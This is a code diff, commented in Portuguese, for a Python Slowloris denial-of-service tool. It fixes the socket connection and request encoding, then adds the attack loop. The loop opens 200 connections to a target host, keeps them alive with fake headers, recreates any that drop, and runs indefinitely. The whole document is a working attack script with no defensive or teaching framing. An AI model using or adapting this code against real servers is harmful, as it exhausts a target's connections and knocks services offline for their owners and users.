@@ -21,12 +21,14 @@ def init_socket():
     socket_atck.settimeout(10)
 
     # conecta o socket ao host que vai ser atacado
-    socket_atck.connect(HOST_ALVO, PORTA_ALVO)
+    endereco_conexao = (HOST_ALVO, PORTA_ALVO)
+    socket_atck.connect(endereco_conexao)
 
     # aqui coloca o pacote inicial 
     if socket_atck:
         try:
-            socket_atck.send(f"GET /?{random.randint(0, 3000)} HTTP/1.1\r\n")
+            string = f"GET /?{random.randint(0, 3000)} HTTP/1.1\r\n"
+            socket_atck.send(string.encode("utf-8"))
             for header in HEADERS:
                 socket_atck.send(header)
         except OSError:
@@ -47,3 +49,31 @@ def enviar_header(socket_atck):
 
 
 # implementação slowloris
+def ataque_slowloris(numero_sockets):    # usar 200 sockets como numero padrão de quantidade
+    # criação dos sockets de ataque
+    for _ in range(numero_sockets):
+        socket_atck = init_socket()
+
+        if socket_atck:
+            lista_sockets.append(socket_atck)
+            print(f"socket {len(lista_sockets)} criado")
+
+    while True:
+        # ataque continuo slowloris, usando headers falsos para manter conexão viva
+        for socket_atck in lista_sockets:
+            enviar_header(socket_atck)
+
+        # recria sockets se a quantidade baixar por algum motivo
+        for _ in range(numero_sockets - len(lista_sockets)):
+            socket_atck = init_socket()
+
+            if socket_atck:
+                lista_sockets.append(socket_atck)
+                print("recriando socket")
+
+        time.sleep(5)
+
+
+if __name__ == "__main__":
+    num_sockets = 200
+    ataque_slowloris(num_sockets)
